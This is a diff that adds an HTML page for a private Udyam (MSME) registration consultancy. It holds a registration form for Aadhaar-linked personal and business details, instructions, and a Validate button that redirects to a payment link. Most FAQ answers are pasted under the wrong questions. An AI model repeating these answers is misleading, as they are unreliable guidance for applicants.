@@ -1,0 +1,860 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Bootstrap demo</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
+  </head>
+  <style>
+    .container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .left-text {
+    flex: 1;
+    text-align: left;
+  }
+
+  .center-text {
+    flex: 1;
+    text-align: center;
+  }
+
+  .right-section {
+    flex: 1;
+    text-align: right;
+    display: flex;
+    justify-content: flex-end;
+    align-items: center;
+  }
+
+  .right-text {
+    margin-right: 10px; /* Add spacing between text and button */
+  }
+
+  .button {
+    background-color: #0259b6;
+    color: #fff;
+    padding: 10px 20px;
+    border: none;
+    cursor: pointer;
+  }
+  .container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .left-section, .right-section {
+    flex: 1;
+    padding: 10px;
+    
+  }
+
+  .right-section {
+    text-align: right;
+  }
+
+  .button {
+    background-color: #007bff;
+    color: #fff;
+    padding: 10px 20px;
+    border: none;
+    cursor: pointer;
+  }
+
+  h1 {
+    font-size: 24px;
+  }
+
+  p {
+    font-size: 18px;
+  }
+  .container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .left-section, .right-section {
+    flex: 1;
+    padding: 10px;
+    
+  }
+
+  .right-section {
+    text-align: right;
+  }
+
+  .button {
+    background-color: #007bff;
+    color: #fff;
+    padding: 10px 20px;
+    border: none;
+    cursor: pointer;
+  }
+
+  h1 {
+    font-size: 24px;
+  }
+
+  p {
+    font-size: 18px;
+  }
+
+  .login-form {
+    text-align: left;
+  }
+
+  .form-input {
+    margin-bottom: 10px;
+    padding: 5px;
+    width: 100%;
+  }
+
+  /* Registration Form Header Styles */
+  .registration-header {
+    background: #1a4171;
+    padding: 10px;
+    text-align: center;
+  }
+
+  .registration-title {
+    color: #fff;
+    font-size: 1.2em;
+    font-weight: bold;
+  }
+  .header {
+    background-color: #333;
+    color: #fff;
+    padding: 10px;
+    text-align: center;
+  }
+
+  .logo-container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 10px;
+  }
+
+  .logo {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  .logo img {
+    width: 50px;
+    height: 50px;
+  }
+
+  .logo-name {
+    margin-top: 5px;
+    font-size: 14px;
+  }
+  .dropdown {
+    position: relative;
+    display: inline-block;
+  }
+
+  /* Style for the dropdown button */
+  .dropdown-button {
+    background-color: #fffefe;
+    color: #fff;
+    padding: 10px;
+    border: none;
+    cursor: pointer;
+  }
+
+   /* Style for the dropdown container */
+   .dropdown {
+    position: relative;
+    display: inline-block;
+  }
+
+  /* Style for the dropdown button */
+  .dropdown-button {
+    background-color: #333;
+    color: #fff;
+    padding: 10px;
+    border: none;
+    cursor: pointer;
+  }
+
+  /* Style for the dropdown content (hidden by default) */
+  .dropdown-content {
+    display: none;
+    position: absolute;
+    background-color: #f9f9f9;
+    min-width: 160px;
+    box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+    z-index: 1;
+  }
+
+  /* Style for the dropdown items */
+  .dropdown-item {
+    padding: 10px;
+    text-decoration: none;
+    display: block;
+    color: #333;
+  }
+
+  /* Change color of dropdown items on hover */
+  .dropdown-item:hover {
+    background-color: #ddd;
+  }
+  .header{
+     width: 100%;
+     height: 100vh;
+     background-image: linear-gradient(rgb(0,0,0,0.7),rgb(0,0,0,0.7)),url(images/header-image.png);
+     background-size: cover;
+     background-position: center;
+     padding: 10px 8px;
+     position: relative;
+
+}
+nav{
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 10px 0;
+}
+.logo{
+    width: 150px;
+    cursor: pointer;
+}
+nav button{
+    border: 0;
+    outline: 0;
+    background: #db0001;
+    color: #fff;
+    padding: 7px 12px;
+    font-size: 12px;
+    border-radius: 4px;
+    margin-left: 10px;
+    cursor: pointer;
+}
+.language-btn{
+    display: inline-flex;
+    align-items: center;
+    background: transparent;
+    border: 1px solid #fff;
+    padding: 7px 10px;
+}
+.language-btn img {
+    width: 10px;
+    margin-left:10px ;
+}
+.header-content{
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%,-50%);
+    text-align: center;
+    margin-top: 100px;
+}
+.header-content h1{
+    font-size: 60px;
+    font-weight: 600;
+    line-height: 70px;
+    max-width: 650px;
+}
+.header-content h3{
+    font-weight: 400;
+    margin-bottom: 20px;
+}
+.email-singup{
+    background: #fff;
+    border-radius: 4px;
+    display: flex;
+    align-items: center;
+    margin-top: 30px;
+    overflow: hidden;
+}
+.email-singup input {
+    flex: 1;
+    border: 0;
+    outline: 0;
+    margin-left: 20px;
+
+}
+.email-singup button {
+    background: #db0001;
+    border: 0;
+    outline: 0;
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+    padding: 15px 30px;
+}
+/*  features  */
+.features{
+    padding: 50px 12%;
+    font-size: 22px;
+
+}
+.row{
+    display: flex;
+    width: 100%;
+    align-items: center;
+    flex-wrap: wrap;
+    padding: 50px 0;
+}
+.text-col{
+    flex-basis: 50%;
+    margin-bottom: 20px;
+
+}
+.img-col{
+    flex-basis: 50%;
+    margin-bottom: 20px;
+
+}
+.img-col img {
+    display: block;
+    width: 90%;
+    margin: auto;
+}
+.features h2 {
+    font-size: 50px;
+    font-weight: 600;
+    margin-bottom: 20px;
+
+}
+/* faq */
+.faq{
+    padding: 10px 12%;
+    text-align: center;
+    font-size: 18px;
+
+}
+.faq h2{
+    font-weight: 500;
+    font-size: 40px;
+}
+.accrdion{
+    margin: 60px auto;
+    width: 100%;
+    max-width: 750px;
+    
+}
+.accrdion li {
+    list-style: none;
+    width: 100%;
+    padding: 5px;
+
+}
+.accrdion li label{
+    display: flex;
+    align-items: center;
+    padding: 20px;
+    font-size: 18px;
+    font-weight: 500;
+    background: #ffffff;
+    margin-bottom: 2px;
+    cursor: pointer;
+    position: relative;
+
+}
+.accrdion label::after{
+    content: '+';
+    font-size: 34px;
+    position: absolute;
+    right: 20px;
+    transition: transform 0.5s;
+}
+input[type="radio"]{
+    display: none;
+}
+.accrdion .content{
+    background: #ffffff;
+    text-align: left;
+    padding: 0 20px;
+    max-height: 0;
+    overflow: hidden;
+    transition: max-height 0.5s,padding 0.5s;
+}
+.accrdion input[type="radio"]:checked + label + .content {
+    max-height: 600px;
+    padding: 30px 20px;
+
+}
+.accrdion input[type="radio"]:checked + label::after{
+    transform: rotate(135deg);
+}
+.faq .email-singup{
+    max-width: 600px;
+    margin: 20px auto 60px;
+
+}
+.faq small {
+    font-size: 13px;
+
+}
+/* footer */
+.footer{
+    padding: 50px 15% 10px;
+    border-top: 6px solid #333;
+    color: #777;
+
+}
+.footer h2{
+    font-size: 18px;
+    font-weight: 400;
+    margin-bottom: 30px;
+
+}
+.footer .col{
+    flex-basis: 25%;
+    flex-grow: 1;
+    margin-bottom: 20px;
+}
+.footer .col a{
+    display: block;
+    text-decoration: none;
+    color: #777;
+    font-size: 14px;
+    margin-bottom: 10px;
+
+}
+.footer .row{
+    align-items: flex-start;
+    padding: 10px 0;
+
+}
+.footer .language-btn{
+    color: #fff;
+    padding: 10px 20px;
+    border-radius: 3px;
+}
+.copyright-text{
+    font-size: 14px;
+    margin-top: 20px;
+    margin-bottom: 10px;
+}
+
+/* media-queries */
+@media only screen and (max-width:600px){
+    .logo {
+
+        width: 100px;
+    }
+    nav button{
+        padding: 5px 10px;
+    }
+   nav .language-btn{
+    padding: 4px 8px;
+   }
+   .header-content{
+    position: unset;
+    transform: none;
+    padding-top: 150px;
+
+   }
+   .header-content h1{
+    font-size: 30px;
+   }
+   .email-singup button{
+    font-size: 12px;
+   }
+   .text-col, .img-col{
+    flex-basis: 100%;
+
+   }
+   .features h2 {
+    font-size: 30px;
+   }
+   .features p {
+    font-size: 15px;
+   }
+   .row:nth-child(2),.row:nth-child(4){
+    flex-direction: column-reverse;
+   }
+   .features .row {
+    padding: 10px 0;
+   }
+   .faq h2 {
+    font-size: 20px;
+
+   }
+   .accrdion .content {
+    font-size: 14px;
+
+   }
+   .accrdion li label{
+    padding: 10px ;
+    font-size: 14px;
+   }
+   label::after{
+    font-size: 22px;
+   }
+}
+  
+  </style>
+  <body>
+    <div class="container">
+        <div class="left-text">
+           <span style="color: red; font-size: 40px;"> e-Udyam</span><br>
+           <span style="color: rgb(30, 63, 250); font-size: 20px;">Online Udyam Registration Consultancy</span>
+        </div>
+        <div class="center-text">
+            <span style="color: red; font-size: 30px;">सूक्ष्म , लघु और मध्यम उद्यम पंजीकरण सेवा</span><br>
+            <span style="color: rgb(30, 63, 250); font-size: 20px;">REGISTRATION FOR MICRO, SMALL & MEDIUM ENTERPRISES</span>
+        </div>
+        <div  class="right-section">
+            
+            <button style="background-color:  #1a4171; border-radius: 6px;"    class="button">contact us</button>
+          </div>
+      </div>
+    <nav style="margin-top: 50px;" class="navbar navbar-expand-lg">
+        <div style="background-color: #1a4171; height: 60px;" class="container-fluid">
+          <a style="color: #ffffff;" class="navbar-brand" href="#">Udyam Registration</a>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+          </button>
+          <div  class="collapse navbar-collapse" id="navbarNav">
+            <ul    class="navbar-nav">
+              <li  class="nav-item">
+                <a style="color: #ffffff;" class="nav-link active" aria-current="page" href="#">Update Udyam</a>
+              </li>
+              <li class="nav-item">
+                <a style="color: #ffffff;" class="nav-link" href="#">Migrate Udyog Adhaar</a>
+              </li>
+              <li class="nav-item">
+                <a style="color: #ffffff;" class="nav-link" href="#">Download Udyam</a>
+              </li>
+              <li class="nav-item">
+                <a style="color: #ffffff;" class="nav-link" aria-disabled="true">Databank Registration</a>
+              </li>
+              <li class="nav-item">
+                <a style="color: #ffffff;" class="nav-link" aria-disabled="true">About us</a>
+              </li>
+              <li class="nav-item">
+                <a style="color: #ffffff;" class="nav-link" aria-disabled="true">Terms & Condition</a>
+              </li>
+              <li class="nav-item">
+                <a style="color: #ffffff;" class="nav-link" aria-disabled="true">Return Policy</a>
+              </li>
+              <li class="nav-item">
+                <a style="color: #ffffff;" class="nav-link" aria-disabled="true">Privacy Policy</a>
+              </li>
+              
+            </ul>
+          </div>
+        </div>
+      </nav>
+      <div style="margin-top: 70px;" class="container">
+        <div style="margin-bottom: 494px; border: 3px solid#1a4171" class="left-section">
+            <!-- Registration Form Header -->
+            <div class="registration-header">
+                <span class="registration-title">Registration Form</span>
+            </div>
+
+            <!-- Registration Form -->
+          <form action="/register" method="POST">
+                <div class="mb-3" style="margin-top: 15px;">
+                    <label for="name" class="form-label">Name of Entrepreneur/Applicant / उद्यमी का नाम</label>
+                    <input type="text" class="form-control" id="name" name="name">
+                </div>
+                <div class="mb-3">
+                    <label for="mobile" class="form-label">Mobile No / मोबाइल नंबर +91-</label>
+                    <input type="text" class="form-control" id="mobile" name="mobile">
+                    <label for="mobile" class="form-label" style="color: #0259b6;">Note:- Mobile Number Must Be Registered With Aadhaar for OTP Udyam Verification</label>
+                </div>
+                <div class="mb-3">
+                    <label for="email" class="form-label">Email ID / ईमेल</label>
+                    <input type="email" class="form-control" id="email" name="email">
+                </div>
+                <div class="mb-3">
+                    <label for="gender" class="form-label">Your Gender</label>
+                    <input type="text" class="form-control" id="gender" name="gender">
+                </div>
+                <div class="mb-3" style="margin-top: 25px;">
+                    <label for="gstin" class="form-label">GSTIN / UIN Exists ?</label>
+                    <input style="margin-top: 15px; width: 535px;" type="text" class="form-control" id="gstin" name="gstin">
+                </div>
+                <div class="mb-3">
+                    <label for="enterpriseName" class="form-label">Name of Enterprise/Business / उद्यम का नाम</label>
+                    <input type="text" class="form-control" id="enterpriseName" name="enterpriseName">
+                </div>
+                <div class="mb-3">
+                    <label for="organizationType" class="form-label">Type of Organisation / संगठन के प्रकार</label>
+                    <input type="text" class="form-control" id="organizationType" name="organizationType">
+                </div>
+
+                <!-- Additional Fields -->
+                <div class="mb-3">
+                    <label for="officeFlatNo" class="form-label">Office Flat No.</label>
+                    <input type="text" class="form-control" id="officeFlatNo" name="officeFlatNo">
+                </div>
+                <div class="mb-3">
+                    <label for="officeBuilding" class="form-label">Office Building</label>
+                    <input type="text" class="form-control" id="officeBuilding" name="officeBuilding">
+                </div>
+                <div class="mb-3">
+                    <label for="road" class="form-label">Road</label>
+                    <input type="text" class="form-control" id="road" name="road">
+                </div>
+                <div class="mb-3">
+                    <label for="area" class="form-label">Area</label>
+                    <input type="text" class="form-control" id="area" name="area">
+                </div>
+                <div class="mb-3">
+                    <label for="city" class="form-label">City</label>
+                    <input type="text" class="form-control" id="city" name="city">
+                </div>
+                <div class="mb-3">
+                    <label for="district" class="form-label">District</label>
+                    <input type="text" class="form-control" id="district" name="district">
+                </div>
+                <div class="mb-3">
+                    <label for="state" class="form-label">State</label>
+                    <input type="text" class="form-control" id="state" name="state">
+                </div>
+                <div class="mb-3">
+                    <label for="pin" class="form-label">Pin</label>
+                    <input type="text" class="form-control" id="pin" name="pin">
+                </div>
+                <div class="mb-3">
+                  <label for="mainBusinessActivity" class="form-label">Main Business Activity of Enterprise / इकाई का प्रमुख गतिविधि</label>
+                  <input type="text" class="form-control" id="mainBusinessActivity" name="mainBusinessActivity">
+              </div>
+              
+         
+          <div class="right-section">
+            <button id="validateButton" type="button" style="background-color: #1a4171; border-radius: 6px;" class="button">Validate</button>
+        </div>
+        
+          
+    
+          <!-- Login Form -->
+         
+        </div>
+        <div style="margin-bottom: 1365px; border: 3px solid #1a4171" class="left-section">
+            <!-- Registration Form Header -->
+            <div class="registration-header">
+              <span class="registration-title">Instructions</span>
+            </div>
+      
+            <!-- Provided Code -->
+           <p><span>1. Name of Applicant </span>: Fill name of Applicant as mentioned on the Aadhaar Card.
+"आधार कार्ड में उल्लिखित आवेदक का नाम भरें।"<br>
+2. Mobile No : Fill the correct Mobile Number of Applicant
+"आवेदक का सही मोबाइल नंबर यहां लिखें। "<br>
+3. Mail ID : Fill the correct Mail ID of Applicant
+"यहां अपनी सही ईमेल आईडी का उल्लेख करें।"<br>
+4. Do you have GSTIN Number? : If you have GSTIN number then select yes otherwise no and If you select yes Fill the correct GSTIN number<br>
+"अगर आपके पास GSTIN नंबर है तो हां का चयन करें अन्यथा नहीं और यदि आप हाँ का चयन करते हैं तो सही GSTIN नंबर भरें"
+5. Gender : Select the gender from provided option
+"आवेदक का लिंग चुनें।"<br>
+6. Name of Enterprise / Business : Fill the name of Business / Enterprise which will get printed on UDYAM Certificate.
+"यहां अपने व्यवसाय के नाम का उल्लेख करें। यह नाम UDYAM प्रमाणपत्र पर मुद्रित किया जाएगा।"<br>
+7. Type of Organization : Select the type of organization from the given options which will get printed on UDYAM Certificate.<br>
+"दिए गए विकल्पों में से संगठन के प्रकार का चयन करें।"
+8. Office Address : Please provide office address.
+"दिए गए क्षेत्रों में ठीक से आधिकारिक पता लिखे |"<br>
+9. Main Business Activity of Enterprise : Select the Main Business activity from the given options.
+"अपनी मुख्य व्यावसायिक गतिविधि चुनें।"</p>
+            
+      
+            <!-- Login Form -->
+           
+          </div>
+        </div>
+        <div class="cantainer">
+            <div style="color: rgb(255, 255, 255); background: #1a4171; border-radius: 10px mb ;" class="header"  >
+                <h1 style="margin-top: 50px;" >Udyam / Udyog Aadhar Registration Procedure - Fast and Easy..!!
+                </h1>
+                <div style="margin-top: 200px;" class="logo-container">
+                <div class="logo">
+                  <img  style="height: 130px; width: 170px;" src="img_348030.png.crdownload" alt="Logo 1">
+                  <span class="logo-name">Fill your Application Form</span>
+                </div>
+                <div class="logo">
+                  <img style="height: 120px; width: 130px;"  src="Online-Payment-Logo-PNG-Clipart-Background.png" alt="Logo 2">
+                  <span class="logo-name">Make Online Payment</span>
+                </div>
+                <div class="logo">
+                  <img src="929531.png" style="height: 120px; width: 150px;" alt="Logo 3">
+                  <span class="logo-name">Our Executive Will Process Your Application</span>
+                </div>
+                <div class="logo">
+                  <img style="height: 120px; width: 160px;" src="download-certificate-512.webp" alt="Logo 4">
+                  <span class="logo-name">Receive Your Certicate Online</span>
+                </div>
+              </div>
+              </div>
+             
+        </div>
+        <h2 style="text-align: center; margin-top: 29px;" >Udyam / Udyog Aadhar Registration Procedure - Fast and Easy..!!</h2>
+       <div class="container" style="margin-right: 600px;">
+        
+        <div style="float: left;" class="left">
+        <div class="faq">
+       
+        <ul class="accrdion">
+            <li style="width: 580px;">
+                <input type="radio" name="accrdion" id="first">
+                <label for="first">Why is credit rating of the micro small borrowers important?</label>
+                <div class="content">
+                    <p>With a view to facilitating credit flow to the Udyam sector and enhancing the comfort-level of the lending institutions, the credit rating of Udyam units done by reputed credit rating agencies and it should be encouraged. Banks are advised to consider these ratings as per availability and wherever appropriate structure their rates of interest depending on the ratings assigned to the borrowing SME units.</p>
+                </div>
+            </li>
+            <li style="width: 580px;">
+                <input type="radio" name="accrdion" id="second">
+                <label for="second"> What is the definition of a sick unit?</label>
+                <div class="content">
+                    <p>A composite loan limit of Rs.1crore can be sanctioned by banks to enable the Udyam entrepreneurs to avail of their working capital and term loan requirement through Single Window in terms of RBI Master Circular on lending to the Udyam sector dated July 1, 2010. All scheduled commercial banks have been advised by our circular RPCD.SME&NFS. BC.No.102/06.04.01/2008-09 on May 4, 2009 that the banks which have sanctioned term loan singly or jointly must also sanction working capital (WC) limit singly (or jointly, in the ratio of term loan) to avoid delay in commencement of commercial production thereby ensuring that there are no cases where term loan has been sanctioned and working capital facilities are yet to be sanctioned. These instructions have been reiterated to schedule commercial banks on March 11, 2010.</p>
+                </div>
+            </li>
+            <li style="width: 580px;">
+                <input type="radio" name="accrdion" id="third">
+                <label for="third"> What support is provided by the Ministry for improving manufacturing competitiveness?</label>
+                <div class="content">
+                    <p>The TEQUP scheme envisages another activity, namely, Product Quality Certification. The main objective of this scheme is to encourage Udyams to Acquire Product Certification Licenses from National / International Bodies, thereby improving their competitiveness. The primary objective of this activity is to provide subsidy to Udyam units towards the expenditure incurred by them for obtaining product certification licenses from National / International standardization Bodies. Under this Activity, Udyam manufacturing units will be provided subsidy to the extent of 75% of the actual expenditure, towards licensing of product to National/International Standards. The maximum GOI assistance allowed per Udyam is Rs.1.5 lakh for obtaining product licensing /Marking to National Standards and Rs. 2.0 lakh for obtaining product licensing /Marking to International standards. One Udyam unit can apply only once under the scheme period.</p>
+                </div>
+            </li>
+            <li style="width: 580px;">
+                <input type="radio" name="accrdion" id="fourth">
+                <label for="fourth"> What support is provided by the Ministry to adopt latest Quality Management Standards and Quality Technology Tools (QMS/QTT)?</label>
+                <div class="content">
+                    <p>Under the National Manufacturing Competitiveness Programme (NMCP) Scheme, one component is “Enabling Udyam manufacturing sector to be competitive through Quality Management Standards/Quality Technology Tools (QMS/QTT)” was initiated in the XIth Five year plan. The main objective of the scheme is to sensitize and encourage MSEs to adopt latest Quality Management Standards/Quality Technology Tools (QMS/QTT) and to keep a watch on sectoral developments by undertaking the stated activities. The major activities under the Scheme are as: a) Introduction of appropriate course modules for technical institutions b) Organizing awareness campaigns for micro & small enterprises. c) Organising competition–watch (c-watch). d) Implementation of quality management standards and quality technology tools in selected micro & small enterprises. e) Monitoring international study missions.</p>
+                </div>
+            </li>
+            <li style="width: 580px;">
+                <input type="radio" name="accrdion" id="first">
+                <label for="first">What support is provided by the Ministry for setting up Business Incubators?</label>
+                <div class="content">
+                    <p>The Ministry implements the Support for Entrepreneurial and Managerial Development of SME’s Through Incubators”. The main purpose of the scheme is to nurture innovative business ideas (new/indigenous technology, processes, products, procedures, etc), which could be commercialized in a year. Under the Scheme, financial assistance between 75% to 85% of the project cost upto maximum of Rs. 8 lakh per idea/unit, provided to Business Incubators (BIs). The BIs are also eligible to avail Rs. 3.78 lakh for infrastructure and training expenses for incubating 10 ideas. Any individual or Micro and Small Industries (MSEs) that has innovative business idea at near commercialisation stage can approach the Business Incubators approved under the scheme. Under the scheme, various institutions like Engineering Colleges, Management Institutions, Research labs, etc. that have in-house incubation facilities and faculty for providing handholding support to new idea/entrepreneur can apply in the prescribed application form.</p>
+                </div>
+            </li>
+            <li style="width: 580px;">
+                <input type="radio" name="accrdion" id="second">
+                <label for="second">Whether there is any scheme for assisting Udyam for Intellectual Property Rights?</label>
+                <div class="content">
+                    <p>Under the National Manufacturing Competitiveness Programme (NMCP) to enhance the competitiveness of the SMEs sector, O/o DC(Udyam) is implementing a scheme “Building Awareness on Intellectual Property Rights (IPR)” for the Udyam. The objective of the scheme is to enhance awareness of Udyam about Intellectual Property Rights (IPRs) to take measure for the protecting their ideas and business strategies. Accordingly, to enable the Udyam sector to face the present challenges of liberalisation, various activities on IPR are being implemented under this scheme.</p>
+                </div>
+            </li>
+            <li style="width: 580px;">
+                <input type="radio" name="accrdion" id="third">
+                <label for="third">What support is provided by the Ministry for enabling Udyam's to get credit rating?</label>
+                
+            </li>
+          
+        </ul>
+       
+    </div>
+  </div>
+  <div class="right" style="margin-bottom: 190px;">
+    <div class="faq">
+       
+       <ul class="accrdion">
+         
+           <li style="width: 580px;">
+               <input type="radio" name="accrdion" id="second">
+               <label for="second">Who Can Apply for Udyam Registration?</label>
+               <div class="content">
+                   <p>A composite loan limit of Rs.1crore can be sanctioned by banks to enable the Udyam entrepreneurs to avail of their working capital and term loan requirement through Single Window in terms of RBI Master Circular on lending to the Udyam sector dated July 1, 2010. All scheduled commercial banks have been advised by our circular RPCD.SME&NFS. BC.No.102/06.04.01/2008-09 on May 4, 2009 that the banks which have sanctioned term loan singly or jointly must also sanction working capital (WC) limit singly (or jointly, in the ratio of term loan) to avoid delay in commencement of commercial production thereby ensuring that there are no cases where term loan has been sanctioned and working capital facilities are yet to be sanctioned. These instructions have been reiterated to schedule commercial banks on March 11, 2010.</p>
+               </div>
+           </li>
+           <li style="width: 580px;">
+               <input type="radio" name="accrdion" id="third">
+               <label for="third">Is physical copy of Certificate issued?</label>
+               <div class="content">
+                   <p>The TEQUP scheme envisages another activity, namely, Product Quality Certification. The main objective of this scheme is to encourage Udyams to Acquire Product Certification Licenses from National / International Bodies, thereby improving their competitiveness. The primary objective of this activity is to provide subsidy to Udyam units towards the expenditure incurred by them for obtaining product certification licenses from National / International standardization Bodies. Under this Activity, Udyam manufacturing units will be provided subsidy to the extent of 75% of the actual expenditure, towards licensing of product to National/International Standards. The maximum GOI assistance allowed per Udyam is Rs.1.5 lakh for obtaining product licensing /Marking to National Standards and Rs. 2.0 lakh for obtaining product licensing /Marking to International standards. One Udyam unit can apply only once under the scheme period.</p>
+               </div>
+           </li>
+           <li style="width: 580px;">
+               <input type="radio" name="accrdion" id="fourth">
+               <label for="fourth">What is the definition of Udyam?</label>
+               <div class="content">
+                   <p>Under the National Manufacturing Competitiveness Programme (NMCP) Scheme, one component is “Enabling Udyam manufacturing sector to be competitive through Quality Management Standards/Quality Technology Tools (QMS/QTT)” was initiated in the XIth Five year plan. The main objective of the scheme is to sensitize and encourage MSEs to adopt latest Quality Management Standards/Quality Technology Tools (QMS/QTT) and to keep a watch on sectoral developments by undertaking the stated activities. The major activities under the Scheme are as: a) Introduction of appropriate course modules for technical institutions b) Organizing awareness campaigns for micro & small enterprises. c) Organising competition–watch (c-watch). d) Implementation of quality management standards and quality technology tools in selected micro & small enterprises. e) Monitoring international study missions.</p>
+               </div>
+           </li>
+           <li style="width: 580px;">
+               <input type="radio" name="accrdion" id="first">
+               <label for="first">What is the support available for technology upgradation?</label>
+               <div class="content">
+                   <p>The Ministry implements the Support for Entrepreneurial and Managerial Development of SME’s Through Incubators”. The main purpose of the scheme is to nurture innovative business ideas (new/indigenous technology, processes, products, procedures, etc), which could be commercialized in a year. Under the Scheme, financial assistance between 75% to 85% of the project cost upto maximum of Rs. 8 lakh per idea/unit, provided to Business Incubators (BIs). The BIs are also eligible to avail Rs. 3.78 lakh for infrastructure and training expenses for incubating 10 ideas. Any individual or Micro and Small Industries (MSEs) that has innovative business idea at near commercialisation stage can approach the Business Incubators approved under the scheme. Under the scheme, various institutions like Engineering Colleges, Management Institutions, Research labs, etc. that have in-house incubation facilities and faculty for providing handholding support to new idea/entrepreneur can apply in the prescribed application form.</p>
+               </div>
+           </li>
+           <li style="width: 580px;">
+               <input type="radio" name="accrdion" id="second">
+               <label for="second">What is the support available for Skill Development?</label>
+               <div class="content">
+                   <p>Under the National Manufacturing Competitiveness Programme (NMCP) to enhance the competitiveness of the SMEs sector, O/o DC(Udyam) is implementing a scheme “Building Awareness on Intellectual Property Rights (IPR)” for the Udyam. The objective of the scheme is to enhance awareness of Udyam about Intellectual Property Rights (IPRs) to take measure for the protecting their ideas and business strategies. Accordingly, to enable the Udyam sector to face the present challenges of liberalisation, various activities on IPR are being implemented under this scheme.</p>
+               </div>
+           </li>
+           <li style="width: 580px;">
+               <input type="radio" name="accrdion" id="third">
+               <label for="third">What support is provided by the Ministry for enabling Udyam's to get credit rating?</label>
+               
+           </li>
+         
+       </ul>
+      
+   </div>
+  </div>
+  </div>
+    <!-- footer -->
+    <div style="background: #1a4171; color: #fff;" class="footer">
+        <h2>Questions? Call 000-800-919-1694</h2>
+        <h2 >Email : @gmail.com</h2>
+        <div class="row">
+            <div  class="col">
+                <a style="color: #fff;" href="#">Udyam Registration</a>
+                <a  style="color: #fff;" href="#">MSME / Udyog Aadhaar Registration</a>
+                <a style="color: #fff;" href="#">Migrate Udyog Adhaar</a>
+                <a style="color: #fff;" href="#">Download Udyam</a>
+            </div>
+            <div class="col">
+                <a style="color: #fff;" href="#">Download Udyam</a>
+                <a style="color: #fff;" href="#">Databank Registration</a>
+                <a style="color: #fff;" href="#">Terms & Condition</a>
+                <a style="color: #fff;"  href="#">Return Policy</a>
+            </div>
+           
+        </div>
+        
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm" crossorigin="anonymous"></script>
+    <script>
+      function toggleDropdown() {
+        var dropdown = document.getElementById("myDropdown");
+        if (dropdown.style.display === "block") {
+          dropdown.style.display = "none";
+        } else {
+          dropdown.style.display = "block";
+        }
+      }
+  
+      function selectItem(itemText) {
+        var dropdownButton = document.querySelector(".dropdown-button");
+        dropdownButton.innerHTML = itemText;
+        toggleDropdown();
+      }
+  
+      // Close the dropdown if the user clicks outside of it
+      window.onclick = function(event) {
+        if (!event.target.matches('.dropdown-button')) {
+          var dropdown = document.getElementById("myDropdown");
+          if (dropdown.style.display === "block") {
+            dropdown.style.display = "none";
+          }
+        }
+      }
+    </script>
+    <script>
+      const validateButton = document.getElementById('validateButton');
+  
+      validateButton.addEventListener('click', () => {
+          // Redirect to the specified href when the button is clicked
+          window.location.href = "https://cosmofeed.com/vp/64fd55e3b545a1001ecc30fd";
+      });
+  </script>
+  </body>
+</html>
